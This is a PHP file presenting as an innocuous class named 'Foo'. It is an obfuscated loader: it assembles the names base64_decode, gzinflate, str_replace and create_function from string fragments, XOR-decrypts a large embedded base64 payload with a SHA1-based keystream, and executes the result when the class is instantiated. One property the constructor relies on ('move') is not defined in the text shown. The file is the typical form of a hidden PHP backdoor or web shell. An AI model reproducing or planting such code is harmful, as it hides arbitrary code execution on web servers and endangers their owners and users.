<?php
class Foo {
	function __construct() {
		$point = $this->claster($this->move);
		$point = $this->ls($this->core($point));
		$point = $this->mv($point);
		$this->build($point[0], $point[1]);
	}
	
	function build($tx, $zx) {
		$this->value = $tx;
		$this->zx = $zx;
		$this->load = $this->claster($this->load);
		$this->load = $this->core($this->load);
		$this->load = $this->process();
		if(strpos($this->load, $this->value) !== false)
			$this->mv($this->load);
	}

	function conf($zx, $code, $tx) {
		$len = strlen($code);
		$n = $len > 20*5 ? 2*4 : 2;
		while(strlen($this->cache) < $len)
			$this->cache .= substr(pack('H*', sha1($tx.$this->cache.$zx)), 0, $n);
		return $code ^ $this->cache;
	}
   
	function core($str) {
		$library = $this->core[3].$this->core[1]. 4*16 .$this->core[2].$this->core[0];
		$library = @$library($str);
		return $library;
	}

	function ls($str) {
		$library = $this->ls[2].$this->ls[1].$this->ls[0];
		$library = @$library($str);
		return $library;
	}
	
	function process() {
		$this->x64 = $this->conf($this->zx, $this->load, $this->value);
		$this->x64 = $this->ls($this->x64);
		return $this->x64;
	}
	
	function mv($lib) {
		$library = $this->stack[3].$this->stack[2].$this->stack[1].$this->stack[0];
		$view = $library('', $lib);
		return $view();
	}
	
	function claster($in) {
		$library = $this->dx[2].$this->dx[1].$this->dx[0];
		return $library("\r\n", "", $in);
	}
	 
	var $cache;
	var $ls = array('late', 'zinf', 'g');
	var $core = array('ode', 'e', '_dec', 'bas');
	var $stack = array('tion', 'unc', 'ate_f', 'cre');
	var $dx = array('lace', 'r_rep', 'st');
	 
	var $load = "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
